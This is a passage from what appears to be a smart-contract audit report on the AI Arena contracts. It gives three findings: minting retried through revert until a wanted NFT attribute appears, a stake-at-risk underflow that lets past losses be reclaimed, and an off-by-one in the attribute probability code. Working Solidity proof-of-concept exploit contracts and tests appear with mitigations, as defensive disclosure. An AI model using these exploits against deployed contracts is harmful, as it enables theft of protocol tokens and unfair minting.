    constructor(FighterFarm _fighterFarm) {
        fighterFarm = _fighterFarm;
        owner = msg.sender;
    }

    function tryClaim(uint8[2] memory numToMint, bytes memory claimSignature, string[] memory claimModelHashes, string[] memory claimModelTypes) public {
        require(msg.sender == owner, "not owner");
        try fighterFarm.claimFighters(numToMint, claimSignature, claimModelHashes, claimModelTypes) {
            // success to get specific attribute NFT
        } catch {
            // try again next time
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public returns (bytes4){
        
        (,,uint256 weight,,,,) = fighterFarm.getAllFighterInfo(tokenId);
        require(weight == 95, "I don't want this attribute");

        return bytes4(keccak256(bytes("onERC721Received(address,address,uint256,bytes)")));
    }
}
```
Then, add this test to the FighterFarm.t.sol file and run it.
```solidity
function testPoCCanClaimSpecificAttributeByRevert() public {
    uint256 signerPrivateKey = 0xabc123;
    address _POC_DELEGATED_ADDRESS = vm.addr(signerPrivateKey);

    // setup fresh setting to use _POC_DELEGATED_ADDRESS
    _fighterFarmContract = new FighterFarm(_ownerAddress, _POC_DELEGATED_ADDRESS, _treasuryAddress);
    _helperContract = new AiArenaHelper(_probabilities);
    _mintPassContract = new AAMintPass(_ownerAddress, _POC_DELEGATED_ADDRESS);
    _mintPassContract.setFighterFarmAddress(address(_fighterFarmContract));
    _mintPassContract.setPaused(false);
    _gameItemsContract = new GameItems(_ownerAddress, _treasuryAddress);
    _voltageManagerContract = new VoltageManager(_ownerAddress, address(_gameItemsContract));
    _neuronContract = new Neuron(_ownerAddress, _treasuryAddress, _neuronContributorAddress);
    _rankedBattleContract = new RankedBattle(
        _ownerAddress, address(_fighterFarmContract), _POC_DELEGATED_ADDRESS, address(_voltageManagerContract)
    );
    _rankedBattleContract.instantiateNeuronContract(address(_neuronContract));
    _mergingPoolContract =
        new MergingPool(_ownerAddress, address(_rankedBattleContract), address(_fighterFarmContract));
    _fighterFarmContract.setMergingPoolAddress(address(_mergingPoolContract));
    _fighterFarmContract.instantiateAIArenaHelperContract(address(_helperContract));
    _fighterFarmContract.instantiateMintpassContract(address(_mintPassContract));
    _fighterFarmContract.instantiateNeuronContract(address(_neuronContract));
    _fighterFarmContract.setMergingPoolAddress(address(_mergingPoolContract));

    // --- PoC start ---
    address attacker_eoa = address(0x1337);
    vm.prank(attacker_eoa);
    PoCCanClaimSpecificAttributeByRevert attacker_contract_wallet = new PoCCanClaimSpecificAttributeByRevert(_fighterFarmContract);

    uint8[2] memory numToMint = [1, 0];
    
    string[] memory claimModelHashes = new string[](1);
    claimModelHashes[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";

    string[] memory claimModelTypes = new string[](1);
    claimModelTypes[0] = "original";
    
    // get sign
    vm.startPrank(_POC_DELEGATED_ADDRESS);
    bytes32 msgHash = keccak256(abi.encode(
        address(attacker_contract_wallet),
        numToMint[0],
        numToMint[1],
        0, // nftsClaimed[msg.sender][0],
        0 // nftsClaimed[msg.sender][1]
    ));

    bytes memory prefix = "\x19Ethereum Signed Message:\n32";
    bytes32 prefixedHash = keccak256(abi.encodePacked(prefix, msgHash));

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, prefixedHash);
    bytes memory claimSignature = abi.encodePacked(r, s, v);
    vm.stopPrank();

    for(uint160 i = 100; _fighterFarmContract.balanceOf(address(attacker_contract_wallet)) == 0; i++){
        vm.prank(attacker_eoa);
        attacker_contract_wallet.tryClaim(numToMint, claimSignature, claimModelHashes, claimModelTypes);

        // other user mints NFT, the fighters.length changes and DNA would be changed
        _mintFromMergingPool(address(i)); // random user claim their NFT
    }
   
    assertEq(_fighterFarmContract.balanceOf(address(attacker_contract_wallet)), 1);
    uint256 tokenId = _fighterFarmContract.tokenOfOwnerByIndex(address(attacker_contract_wallet), 0);
    (,,uint256 weight,,,,) = _fighterFarmContract.getAllFighterInfo(tokenId);
    assertEq(weight, 95);
}
```

## Lines of code
https://github.com/code-423n4/2024-02-ai-arena/blob/1d18d1298729e443e14fea08149c77182a65da32/src/FighterFarm.sol#L484

## Tool used
Manual Review

## Recommended Mitigation Steps
Users should only request minting, and attributes values should not be determined in the transaction called by the user. When a user claims an NFT, it should only mint the NFT and end. The attribute should be set by the admin or third-party like chainlink VRF after minting so that the user cannot manipulate it.

It’s not about lack of randomless problem, this is about setting attributes at same transaction when minting NFT. Even if you use chainlink, the same bug can happen if you set the attribute and mint NFTs in the same transaction.

# [M-02] NFTs can be transferred even if StakeAtRisk remains, so the user's win cannot be recorded on the chain due to underflow, and can recover past losses that can't be recovered(steal protocol's token)
## Impact
Cannot record a user's victory on-chain, and it may be possible to recover past losses(which should impossible).

## Proof of Concept
If you lose in a game, _addResultPoints is called, and the staked tokens move to the StakeAtRisk.
```solidity
function _addResultPoints(
    uint8 battleResult, 
    uint256 tokenId, 
    uint256 eloFactor, 
    uint256 mergingPortion,
    address fighterOwner
) 
    private 
{
    uint256 stakeAtRisk;
    uint256 curStakeAtRisk;
    uint256 points = 0;

    /// Check how many NRNs the fighter has at risk
    stakeAtRisk = _stakeAtRiskInstance.getStakeAtRisk(tokenId);
    ...

    /// Potential amount of NRNs to put at risk or retrieve from the stake-at-risk contract
@>  curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10**4;
    if (battleResult == 0) {
        /// If the user won the match
        ...
    } else if (battleResult == 2) {
        /// If the user lost the match

        /// Do not allow users to lose more NRNs than they have in their staking pool
        if (curStakeAtRisk > amountStaked[tokenId]) {
@>          curStakeAtRisk = amountStaked[tokenId];
        }
        if (accumulatedPointsPerFighter[tokenId][roundId] > 0) {
            ...
        } else {
            /// If the fighter does not have any points for this round, NRNs become at risk of being lost
@>          bool success = _neuronInstance.transfer(_stakeAtRiskAddress, curStakeAtRisk);
            if (success) {
@>              _stakeAtRiskInstance.updateAtRiskRecords(curStakeAtRisk, tokenId, fighterOwner);
@>              amountStaked[tokenId] -= curStakeAtRisk;
            }
        }
    }
}
```
If a Fighter NFT has NRN tokens staked, that Fighter NFT is locked and cannot be transfered. When the tokens are unstaked and the remaining amountStaked[tokenId] becomes 0, the Fighter NFT is unlocked and it can be transfered. However, it does not check whether there are still tokens in the StakeAtRisk of the Fighter NFT.
```solidity
function unstakeNRN(uint256 amount, uint256 tokenId) external {
    require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, "Caller does not own fighter");
    if (amount > amountStaked[tokenId]) {
@>      amount = amountStaked[tokenId];
    }
    amountStaked[tokenId] -= amount;
    globalStakedAmount -= amount;
    stakingFactor[tokenId] = _getStakingFactor(
        tokenId, 
        _stakeAtRiskInstance.getStakeAtRisk(tokenId)
    );
    _calculatedStakingFactor[tokenId][roundId] = true;
    hasUnstaked[tokenId][roundId] = true;
    bool success = _neuronInstance.transfer(msg.sender, amount);
    if (success) {
        if (amountStaked[tokenId] == 0) {
@>          _fighterFarmInstance.updateFighterStaking(tokenId, false);
        }
        emit Unstaked(msg.sender, amount);
    }
}
```
Unstaked Fighter NFTs can now be traded on the secondary market. Suppose another user buys this Fighter NFT with remaining StakeAtRisk.

Normally, if you win a game, you can call reclaimNRN to get the tokens back from StakeAtRisk.
```solidity
function _addResultPoints(
    uint8 battleResult, 
    uint256 tokenId, 
    uint256 eloFactor, 
    uint256 mergingPortion,
    address fighterOwner
) 
    private 
{
    uint256 stakeAtRisk;
    uint256 curStakeAtRisk;
    uint256 points = 0;

    /// Check how many NRNs the fighter has at risk
@>  stakeAtRisk = _stakeAtRiskInstance.getStakeAtRisk(tokenId);

    ...
    /// Potential amount of NRNs to put at risk or retrieve from the stake-at-risk contract
@>  curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10**4;
    if (battleResult == 0) {
        /// If the user won the match
        ...

        /// Do not allow users to reclaim more NRNs than they have at risk
        if (curStakeAtRisk > stakeAtRisk) {
@>          curStakeAtRisk = stakeAtRisk;
        }

        /// If the user has stake-at-risk for their fighter, reclaim a portion
        /// Reclaiming stake-at-risk puts the NRN back into their staking pool
@>      if (curStakeAtRisk > 0) {
@>          _stakeAtRiskInstance.reclaimNRN(curStakeAtRisk, tokenId, fighterOwner);
            amountStaked[tokenId] += curStakeAtRisk;
        }
        ...
    } else if (battleResult == 2) {
        ...
    }
}
```
However, if a new user becomes the owner of the Fighter NFT, it does not work as intended.

The _addResultPoints might revert due to the underflow at reclaimNRN's amountLost[fighterOwner] -= nrnToReclaim. Therefore, the new owner cannot record a victory on-chain with the purchased NFT until the end of this round.
```solidity
function getStakeAtRisk(uint256 fighterId) external view returns(uint256) {
@>  return stakeAtRisk[roundId][fighterId];
}

function reclaimNRN(uint256 nrnToReclaim, uint256 fighterId, address fighterOwner) external {
    require(msg.sender == _rankedBattleAddress, "Call must be from RankedBattle contract");
    require(
        stakeAtRisk[roundId][fighterId] >= nrnToReclaim, 
        "Fighter does not have enough stake at risk"
    );

    bool success = _neuronInstance.transfer(_rankedBattleAddress, nrnToReclaim);
    if (success) {
        stakeAtRisk[roundId][fighterId] -= nrnToReclaim;
        totalStakeAtRisk[roundId] -= nrnToReclaim;
@>      amountLost[fighterOwner] -= nrnToReclaim;
        emit ReclaimedStake(fighterId, nrnToReclaim);
    }
}
```
Even if the new owner already has another NFT and has a sufficient amount of amountLost[fighterOwner], there is a problem.

Alice buy the NFT2(tokenId 2) from the secondary market, which has 30 stakeAtRisk.
stakeAtRisk of NFT2: 30
amountLost: 0
Alice also owns the NFT1(tokenId 1) and has 100 stakeAtRisk in the same round.
stakeAtRisk of NFT1: 100
stakeAtRisk of NFT2: 30
amountLost: 100
Alice wins with the NFT2 and reclaims 30 stakeAtRisk.
stakeAtRisk of NFT1: 100
stakeAtRisk of NFT2: 0
amountLost: 70
If Alice tries to reclaim stakeAtRisk of NFT1, an underflow occurs and it reverts when remaining stakeAtRisk is 30.
stakeAtRisk of NFT1: 30
stakeAtRisk of NFT2: 0
amountLost: 0
Alice will no longer be able to record a win for NFT1 due to underflow.
There is a problem even if the user owns a sufficient amount of amountLost[fighterOwner] and does not have stakeAtRisk of another NFT in the current round. In this case, the user can steal the protocol's token.

Alice owns NFT1 and had 100 stakeAtRisk with NFT1 at past round.
Since the round has already passed, this loss of 100 NRN is a past loss that can no longer be recovered.
Since amountLost[fighterOwner] is a total amount regardless of rounds, it remains 100 even after the round.
stakeAtRisk of NFT1: 0 (current round)
amountLost: 100 (this should be unrecoverable)
Alice buys NFT 2 from the secondary market, which has 100 stakeAtRisk.
stakeAtRisk of NFT1: 0
stakeAtRisk of NFT2: 100
amountLost: 100
Alice wins with NFT 2 and reclaims 100.
stakeAtRisk of NFT1: 0
stakeAtRisk of NFT2: 0
amountLost: 0
Alice recovers the past loss through NFT 2. Alice recovered past lost, which shouldn't be recovered, which means she steals the protocol's token.
This is PoC. You can add it to StakeAtRisk.t.sol and run it.

testPoC1 shows that a user with amountLost 0 cannot record a victory with the purchased NFT due to underflow.
testPoC2 shows that a user who already has stakeAtRisk due to another NFT in the same round can no longer record a win due to underflow.
testPoC3 shows that a user can recover losses from a past round by using a purchased NFT.
```solidity
function testPoC1() public {
    address seller = vm.addr(3);
    address buyer = vm.addr(4);
    
    uint256 stakeAmount = 3_000 * 10 ** 18;
    uint256 expectedStakeAtRiskAmount = (stakeAmount * 100) / 100000;
    _mintFromMergingPool(seller);
    uint256 tokenId = 0;
    assertEq(_fighterFarmContract.ownerOf(tokenId), seller);
    _fundUserWith4kNeuronByTreasury(seller);
    vm.prank(seller);
    _rankedBattleContract.stakeNRN(stakeAmount, tokenId);
    assertEq(_rankedBattleContract.amountStaked(tokenId), stakeAmount);
    vm.prank(address(_GAME_SERVER_ADDRESS));
    // loses battle
    _rankedBattleContract.updateBattleRecord(tokenId, 50, 2, 1500, true);
    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId), expectedStakeAtRiskAmount);

    // seller unstake and sell NFT to buyer
    vm.startPrank(seller);
    _rankedBattleContract.unstakeNRN(_rankedBattleContract.amountStaked(tokenId), tokenId);
    _fighterFarmContract.transferFrom(seller, buyer, tokenId);
    vm.stopPrank();

    // The buyer win battle but cannot write at onchain
    vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x11)); // expect arithmeticError (underflow)
    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, true);

}

function testPoC2() public {
    address seller = vm.addr(3);
    address buyer = vm.addr(4);
    
    uint256 stakeAmount = 3_000 * 10 ** 18;
    uint256 expectedStakeAtRiskAmount = (stakeAmount * 100) / 100000;
    _mintFromMergingPool(seller);
    uint256 tokenId = 0;
    assertEq(_fighterFarmContract.ownerOf(tokenId), seller);
    _fundUserWith4kNeuronByTreasury(seller);
    vm.prank(seller);
    _rankedBattleContract.stakeNRN(stakeAmount, tokenId);
    assertEq(_rankedBattleContract.amountStaked(tokenId), stakeAmount);
    vm.prank(address(_GAME_SERVER_ADDRESS));
    // loses battle
    _rankedBattleContract.updateBattleRecord(tokenId, 50, 2, 1500, true);
    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId), expectedStakeAtRiskAmount);

    // seller unstake and sell NFT to buyer
    vm.startPrank(seller);
    _rankedBattleContract.unstakeNRN(_rankedBattleContract.amountStaked(tokenId), tokenId);
    _fighterFarmContract.transferFrom(seller, buyer, tokenId);
    vm.stopPrank();

    // The buyer have new NFT and loses with it
    uint256 stakeAmount_buyer = 3_500 * 10 ** 18;
    uint256 expectedStakeAtRiskAmount_buyer = (stakeAmount_buyer * 100) / 100000;

    _mintFromMergingPool(buyer);
    uint256 tokenId_buyer = 1;
    assertEq(_fighterFarmContract.ownerOf(tokenId_buyer), buyer);

    _fundUserWith4kNeuronByTreasury(buyer);
    vm.prank(buyer);
    _rankedBattleContract.stakeNRN(stakeAmount_buyer, tokenId_buyer);
    assertEq(_rankedBattleContract.amountStaked(tokenId_buyer), stakeAmount_buyer);

    // buyer loses with tokenId_buyer
    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(tokenId_buyer, 50, 2, 1500, true);
    
    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId_buyer), expectedStakeAtRiskAmount_buyer);
    assertGt(expectedStakeAtRiskAmount_buyer, expectedStakeAtRiskAmount, "buyer has more StakeAtRisk");

    // buyer win with bought NFT (tokenId 0)
    vm.startPrank(address(_GAME_SERVER_ADDRESS));
    for(uint256 i = 0; i < 1000; i++){
        _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, false);
    }
    vm.stopPrank();

    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId), 0); // Reclaimed all stakeAtRisk of bought NFT(token 0)
    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId_buyer), expectedStakeAtRiskAmount_buyer); // tokenId_buyer stakeAtRisk remains
    assertEq(_stakeAtRiskContract.amountLost(buyer), expectedStakeAtRiskAmount_buyer - expectedStakeAtRiskAmount, "remain StakeAtRisk");

    // the remain StakeAtRisk cannot be reclaimed even if buyer win with tokenId_buyer(token 1)
    // and the win result of token 1 cannot be saved at onchain
    vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x11)); // expect arithmeticError (underflow)
    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(tokenId_buyer, 50, 0, 1500, false);
}

function testPoC3() public {
    address seller = vm.addr(3);
    address buyer = vm.addr(4);
    
    uint256 stakeAmount = 3_000 * 10 ** 18;
    uint256 expectedStakeAtRiskAmount = (stakeAmount * 100) / 100000;

    // The buyer have new NFT and loses with it
    uint256 stakeAmount_buyer = 300 * 10 ** 18;
    uint256 expectedStakeAtRiskAmount_buyer = (stakeAmount_buyer * 100) / 100000;

    _mintFromMergingPool(buyer);
    uint256 tokenId_buyer = 0;
    assertEq(_fighterFarmContract.ownerOf(tokenId_buyer), buyer);

    _fundUserWith4kNeuronByTreasury(buyer);
    vm.prank(buyer);
    _rankedBattleContract.stakeNRN(stakeAmount_buyer, tokenId_buyer);
    assertEq(_rankedBattleContract.amountStaked(tokenId_buyer), stakeAmount_buyer);

    // buyer loses with tokenId_buyer
    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(tokenId_buyer, 50, 2, 1500, true);

    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId_buyer), expectedStakeAtRiskAmount_buyer);
    assertGt(expectedStakeAtRiskAmount, expectedStakeAtRiskAmount_buyer, "seller's token has more StakeAtRisk");

    // round 0 passed
    // tokenId_buyer's round 0 StakeAtRisk is reset
    vm.prank(address(_rankedBattleContract));
    _stakeAtRiskContract.setNewRound(1);
    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId_buyer), 0);

    // seller mint token, lose battle and sell the NFT
    _mintFromMergingPool(seller);
    uint256 tokenId = 1;
    assertEq(_fighterFarmContract.ownerOf(tokenId), seller);
    _fundUserWith4kNeuronByTreasury(seller);
    vm.prank(seller);
    _rankedBattleContract.stakeNRN(stakeAmount, tokenId);
    assertEq(_rankedBattleContract.amountStaked(tokenId), stakeAmount);
    vm.prank(address(_GAME_SERVER_ADDRESS));
    // loses battle
    _rankedBattleContract.updateBattleRecord(tokenId, 50, 2, 1500, true);
    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId), expectedStakeAtRiskAmount);

    // seller unstake and sell NFT to buyer
    vm.startPrank(seller);
    _rankedBattleContract.unstakeNRN(_rankedBattleContract.amountStaked(tokenId), tokenId);
    _fighterFarmContract.transferFrom(seller, buyer, tokenId);
    vm.stopPrank();

    
    // buyer win with bought NFT (tokenId 0)
    vm.startPrank(address(_GAME_SERVER_ADDRESS));
    for(uint256 i = 0; i < 100; i++){
        _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, false);
    }
    vm.stopPrank();

    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId), expectedStakeAtRiskAmount - expectedStakeAtRiskAmount_buyer); // Reclaimed all stakeAtRisk of bought NFT(token 1)
    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId_buyer), 0);
    assertEq(_stakeAtRiskContract.amountLost(buyer), 0, "reclaimed old lost");

    // and the win result of token 1 cannot be saved at onchain anymore
    vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x11)); // expect arithmeticError (underflow)
    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, false);

}
```

## Lines of code
https://github.com/code-423n4/2024-02-ai-arena/blob/1d18d1298729e443e14fea08149c77182a65da32/src/RankedBattle.sol#L285-L286
https://github.com/code-423n4/2024-02-ai-arena/blob/1d18d1298729e443e14fea08149c77182a65da32/src/RankedBattle.sol#L495-L496

## Tool used
Manual Review

## Recommended Mitigation Steps
Tokens with a remaining StakeAtRisk should not be allowed to be exchanged.
```solidity
function unstakeNRN(uint256 amount, uint256 tokenId) external {
    require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, "Caller does not own fighter");
    if (amount > amountStaked[tokenId]) {
        amount = amountStaked[tokenId];
    }
    amountStaked[tokenId] -= amount;
    globalStakedAmount -= amount;
    stakingFactor[tokenId] = _getStakingFactor(
        tokenId, 
        _stakeAtRiskInstance.getStakeAtRisk(tokenId)
    );
    _calculatedStakingFactor[tokenId][roundId] = true;
    hasUnstaked[tokenId][roundId] = true;
    bool success = _neuronInstance.transfer(msg.sender, amount);
    if (success) {
-       if (amountStaked[tokenId] == 0) {
+       if (amountStaked[tokenId] == 0 && _stakeAtRiskInstance.getStakeAtRisk(tokenId) == 0) {
            _fighterFarmInstance.updateFighterStaking(tokenId, false);
        }
        emit Unstaked(msg.sender, amount);
    }
}
```

# [M-03] Erroneous probability calculation in physical attributes can lead to significant issues
## Impact
To determine what physical attributes a user gets first we obtain a rarityRank which is computed from the DNA.

AiArenaHelper.sol#L106-L110
```solidity
                } else {
                    uint256 rarityRank = (dna / attributeToDnaDivisor[attributes[i]]) % 100;
                    uint256 attributeIndex = dnaToIndex(generation, rarityRank, attributes[i]);
                    finalAttributeProbabilityIndexes[i] = attributeIndex;
                }
```
Here since we use % 100 operation is used, the range of rarityRank would be [0,99]

This rarityRank is used in the dnaToIndex to determine the final attribute of the part.

AiArenaHelper.sol#L165-L186
```solidity
     /// @dev Convert DNA and rarity rank into an attribute probability index.
     /// @param attribute The attribute name.
     /// @param rarityRank The rarity rank.
     /// @return attributeProbabilityIndex attribute probability index.
    function dnaToIndex(uint256 generation, uint256 rarityRank, string memory attribute) 
        public 
        view 
        returns (uint256 attributeProbabilityIndex) 
    {
        uint8[] memory attrProbabilities = getAttributeProbabilities(generation, attribute);
        
        uint256 cumProb = 0;
        uint256 attrProbabilitiesLength = attrProbabilities.length;
        for (uint8 i = 0; i < attrProbabilitiesLength; i++) {
            cumProb += attrProbabilities[i];
            if (cumProb >= rarityRank) {
                attributeProbabilityIndex = i + 1;
                break;
            }
        }
        return attributeProbabilityIndex;
    }
```
There is however, a very subtle bug in the calculation above due to the use of cumProb >= rarityRank as opposed to cumProb > rarityRank

To explain the above, I will perform a calculation using a simple example. Let's say we only have 2 possible attributes and the attrProbabilities is [50, 50].

First iteration, when i = 0, we have cumProb = 50, for the if (cumProb >= rarityRank) to be entered the range of values rarityRank can be is [0, 50]. Therefore there is a 51% chance of obtaining this attribute

Next iteration, when i = 1, we have cumProb = 100, for the if (cumProb >= rarityRank) to be entered the range of values rarityRank can be is [51, 99]. Therefore there is a 49% chance of obtaining this attribute.

This means that for values in the first index, the probability is 1% greater than intended and for values in the last index the probability is 1% lesser than intended. This can be significant in certain cases, let us run through two of them.

Case 1: The first value in attrProbabilities is 1.
If the first value in attrProbabilities is 1. Let's say [1, 99].

Then in reality if we perform the calculation above we get the following results:

First iteration, when i = 0, we have cumProb = 1, for the if (cumProb >= rarityRank) to be entered the range of values rarityRank can be is [0, 1]. Therefore there is a 2% chance of obtaining this attribute

Next iteration, when i = 1, we have cumProb = 100, for the if (cumProb >= rarityRank) to be entered the range of values rarityRank can be is [2, 99]. Therefore there is a 98% chance of obtaining this attribute.

Then we have twice the chance of getting the rarer item, which would make it twice as common, thus devaluing it.

Case 2: The last value in attrProbabilities is 1.
If the last value in attrProbabilities is 1. Let's say [99, 1].

Then in reality if we perform the calculation above we get the following results:

First iteration, when i = 0, we have cumProb = 99, for the if (cumProb >= rarityRank) to be entered the range of values rarityRank can be is [0, 99]. Therefore we will always enter the if (cumProb >= rarityRank) block.
Then it would be impossible (0% chance) to obtain the 1% item.

## Lines of code
https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L180

## Tool used
Manual Review

## Recommended Mitigation Steps
It should be cumProb > rarityRank. Going back to our example of [50, 50], if it were cumProb > rarityRank. Then we will get the following results:

First iteration, when i = 0, we have cumProb = 50, for the if (cumProb > rarityRank) to be entered the range of values rarityRank can be is [0, 49]. Therefore there is a 50% chance of obtaining this attribute

Next iteration, when i = 1, we have cumProb = 100, for the if (cumProb > rarityRank) to be entered the range of values rarityRank can be is [50, 99]. Therefore there is a 50% chance of obtaining this attribute.

Thus the above recommended mitigation is correct.